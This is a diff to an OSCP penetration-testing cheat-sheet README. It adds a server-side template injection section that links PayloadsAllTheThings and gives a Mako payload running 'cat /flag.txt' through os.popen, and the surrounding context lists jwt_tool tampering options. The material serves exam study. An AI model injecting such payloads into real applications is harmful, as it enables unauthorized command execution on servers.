@@ -37,6 +37,10 @@ This repository describes cheat sheet and knowledge for OSCP.
     - [jwt\_tool](#jwt_tool)
       - [tampering](#tampering)
       - [exploit](#exploit)
+- [SSTI (Server-Side Template Injection)](#ssti-server-side-template-injection)
+  - [PayloadsAllTheThings](#payloadsallthethings)
+    - [Mako](#mako)
+      - [RCE](#rce)
 - [Linux command](#linux-command)
   - [Basic command](#basic-command)
     - [Show allowing commands as root user](#show-allowing-commands-as-root-user)
@@ -184,6 +188,16 @@ The parameter can be specified as follow:
 `s`: spoof JWKS  
 `k`: key confusion  
 `i`: inject inline JKWS  
+
+# SSTI (Server-Side Template Injection)
+## PayloadsAllTheThings
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md
+
+### Mako
+#### RCE
+``` shell
+${self.module.cache.util.os.popen("cat /flag.txt").read()}
+```
 
 
 # Linux command
